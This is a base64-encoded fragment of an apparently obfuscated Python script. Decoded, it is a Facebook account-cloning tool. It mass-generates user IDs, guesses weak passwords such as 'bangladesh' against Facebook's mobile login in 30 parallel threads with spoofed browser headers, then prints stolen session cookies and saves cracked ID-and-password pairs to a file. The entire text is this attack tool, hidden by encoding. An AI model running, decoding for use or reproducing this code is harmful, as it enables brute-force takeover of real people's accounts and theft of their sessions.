vwn5iNXDAzM1sxOzMybV1cMDMzWzE7MzJtIFlPVVIgTElNSVRFRCA6ICcpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDQpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTMwKSBhcyBhc2hhOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgdGwgPSBzdHIobGVuKHVzZXIpKQ0KICAgICAgICBwcmludCgiXDAzM1sxOzM0beKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpDQogICAgICAgIHByaW50KCdcMDMzWzE7MzNtW/CfmIFcMDMzWzE7MzNtXSBcMDMzWzE7MzZtWU9VUiBUT1RBTCBJRFMgOiBcMDMzWzE7MzJtJyt0bCkNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszM21b8J+YgVwwMzNbMTszM21dIFwwMzNbMTszNm1ZT1VSIFNJTSBDT0RFIDpcMDMzWzE7MzJtICIrY29kZSkNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszM21b8J+YgVwwMzNbMTszM21dXDAzM1sxOzM1bSBQTEVBU0UgV0FJVCBDTE9OSU5HIFNUQVJUJykNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszM21b8J+YgVwwMzNbMTszM21dIFwwMzNbMTszNG1VU0UgRkxJR0hUIE1PREUgT04vT0YgRk9SIFNQRUVEIFVQJykNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszM21b8J+YgVwwMzNbMTszM21dIFwwMzNbMTszNW1TVVBFUiBGQVNUIFNQRUVEIENMT05JTkcnKQ0KICAgICAgICBwcmludCgiXDAzM1sxOzM0beKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpDQogICAgICAgIGZvciBsb3ZlIGluIHVzZXI6DQogICAgICAgICAgICB1aWQgPSBjb2RlK25hbWUrY29kK2xvdmUNCiAgICAgICAgICAgIHB3eCA9IFtjb2RlK25hbWUrY29kK2xvdmUsY29kK2xvdmUsbmFtZStsb3ZlLGNvZGUrbmFtZStjb2QsJ2JhbmdsYWRlc2gnLCdCYW5nbGFkZXNoJ10NCiAgICAgICAgICAgIGFzaGEuc3VibWl0KGFsaDRhaix1aWQscHd4LHRsKQ0KICAgIHByaW50KCLilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEiKQ0KICAgIHByaW50KCcgW/CfmIFdIE9LIERhcmstT0sudHh0JykNCiAgICBwcmludCgnIFvwn5iBXSBDUCBEYXJrLU9LLnR4dCcpDQogICAgcHJpbnQoIuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpDQpkZWYgYWxoNGFqKHVpZCxwd3gsdGwpOg0KICAgIGdsb2JhbCBsb29wDQogICAgZ2xvYmFsIGNwcw0KICAgIGdsb2JhbCBva3MNCiAgICBnbG9iYWwgcHJveHkNCiAgICB0cnk6DQogICAgICAgIGZvciBwcyBpbiBwd3g6DQogICAgICAgICAgICBwcm8gPSByYW5kb20uY2hvaWNlKHVnZW4pDQogICAgICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcclwwMzNbMTszMm1bIFBSSU5DLUxJTU9OXVwwMzNbMTszNm3wn5iNWyVzLyVzXfCfmIFcMDMzWzE7MzJtW09LLSVzXVwwMzNbMTszNW0gXHInJShsb29wLHRsLGxlbihva3MpKSksDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9wLmZhY2Vib29rLmNvbScpLnRleHQNCiAgICAgICAgICAgIGxvZ19kYXRhID0gew0KICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgIm1fdHMiOnJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwNCiAgICAgICAgICAgICJ1bnJlY29nbml6ZWRfdHJpZXMiOiIwIiwNCiAgICAgICAgICAgICJlbWFpbCI6dWlkLA0KICAgICAgICAgICAgInBhc3MiOnBzLA0KICAgICAgICAgICAgImxvZ2luIjoiTG9nIEluIn0NCiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7J2F1dGhvcml0eSc6ICdwLmZhY2Vib29rLmNvbScsDQogICAgJ21ldGhvZCc6ICdHRVQnLA0KICAgICdzY2hlbWUnOiAnaHR0cHMnLA0KICAgICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43JywNCiAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2JuLUJELGJuO3E9MC45LGVuLUdCO3E9MC44LGVuO3E9MC43LGJuLUlOO3E9MC42LGVuLVVTO3E9MC41JywNCiAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICdkcHInOiAnMi44Mzc1MDAwOTUzNjc0MzE2JywNCiAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2RhcmsnLA0KICAgICdzZWMtY2gtdWEnOiAnIk5vdClBO0JyYW5kIjt2PSIyNCIsICJDaHJvbWl1bSI7dj0iMTE2IicsDQogICAgJ3NlYy1jaC11YS1mdWxsLXZlcnNpb24tbGlzdCc6ICciTm90KUE7QnJhbmQiO3Y9IjI0LjAuMC4wIiwgIkNocm9taXVtIjt2PSIxMTYuMC41ODQ1LjcyIicsDQogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLA0KICAgICdzZWMtY2gtdWEtbW9kZWwnOiAnIlNNLU0yMTVGIicsDQogICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLA0KICAgICdzZWMtY2gtdWEtcGxhdGZvcm0tdmVyc2lvbic6ICciMTIuMC4wIicsDQogICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywNCiAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLA0KICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdub25lJywNCiAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLA0KICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLA0KICAgICMgPVsgVUEgPSBQUk8gXT0gIw0KICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQogICAgJ3ZpZXdwb3J0LXdpZHRoJzogJzk4MCcsfQ0KICAgICAgICAgICAgbyA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly9wLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8/cmVmc3JjPWRlcHJlY2F0ZWQmbHd2PTEwMCZyZWZpZD04JyxkYXRhPWxvZ19kYXRhLGhlYWRlcnM9aGVhZGVyX2ZyZWVmYikudGV4dA0KICAgICAgICAgICAgbG9nX2Nvb2tpZXM9c2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkua2V5cygpDQogICAgICAgICAgICBpZiAnY191c2VyJyBpbiBsb2dfY29va2llczoNCiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgY2lkID0gY29raVs3OjIyXQ0KI19fX19fX/CdkbbwnZGyLfCdkbDwnZG1LfCdka3wnZG58J2RtvCfkYfwn5GH8J+Rh/CfkYcgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHJpbnQoZiIiIuKdtFwwMzNbMzg7NTs0Nm3wnZmK8J2ZhiDwnZmE8J2Yv1/inbVdDQpcMDMzWzM4OzU7NDZt4p20XHgxYlsxOzkxbeKXj1x4MWJbMTs5Mm3ilZDilIHilZDilIHilZDilIHilZDilIHilZDilIHilIHilZDilIHilZDilIHilZBceDFiWzE7OTFt4p20XDAzM1s0N21cMDMzWzE7NDZtXDAzM1s0MG1cMDMzWzAwbVx4MWJbMTs5MW3inbVceDFiWzE7OTJt4pWQ4pSB4pWQ4pSB4pWQ4pSB4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQXHgxYlsxOzkxbeKXj+KdtQ0KXDAzM1szMzsxbfCdmL7wnZmK8J2ZivCdmYbwnZmA8J2ZjuKdtFwwMzNbMzg7NTs0Nm3wnZmH8J2ZhPCdmY/wnZmAK/CdmYfwnZmK8J2ZgvCdmYTwnZmJ4p21XDAzM1szNzsxbSA6IHtjb2tpfQ0KXDAzM1szODs1OzQ2beKdtFx4MWJbMTs5MW3il49ceDFiWzE7OTJt4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pSB4pWQ4pSB4pWQ4pSB4pWQXHgxYlsxOzkxbeKdtFwwMzNbNDdtXDAzM1sxOzQ2bVwwMzNbNDBtXDAzM1swMG1ceDFiWzE7OTFt4p21XHgxYlsxOzkybeKVkOKUgeKVkOKUgeKVkOKUgeKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkFx4MWJbMTs5MW3il4/inbUNClwwMzNbMzg7NTs0Nm3ilIzilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilJAgICAgICAgICAgDQpcMDMzWzMzOzFtICAgIEwtUyBCUk9USEVSIPCdmYHwnZi88J2YvvCdmYDwnZi98J2ZivCdmYrwnZmGXDAzM1szODs1OzQ2beKdtPCdmYnwnZmQ8J2ZiPCdmL3wnZmA8J2ZjeKdtVwwMzNbMzg7NTs0Nm06IHt1aWR9IA0KXDAzM1szODs1OzQ2beKUlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKUmA0KXDAzM1szODs1OzQ2beKUjOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKUkA0KXDAzM1szMzsxbSAgICAgTC1TIEJST1RIRVIgIPCdmYHwnZi88J2YvvCdmYDwnZi98J2ZivCdmYrwnZmGXDAzM1szODs1OzQ2beKdtPCdmYvwnZi88J2ZjvCdmY7wnZmS8J2ZivCdmY3wnZi/4p21IFwwMzNbMzg7NTs0Nm06IHtwc30NClwwMzNbMzg7NTs0Nm3ilJTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilJgNCiIiIikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbODI6OTddDQogICAgICAgICAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzNtW1wwMzNbMTszMm1MSU1PTi1DUFwwMzNbMTszM21dXDAzM1sxOzkxbSB7dWlkfXx7cHN9IikNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0RhcmtDUC50eHQnLCAnYScpLndyaXRlKCB1aWQrJyB8ICcrcHMrJyBcbicpDQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbG9vcCs9MQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgICAgICANCk1haW4oKQ0KIyBFTkQgIw0K'))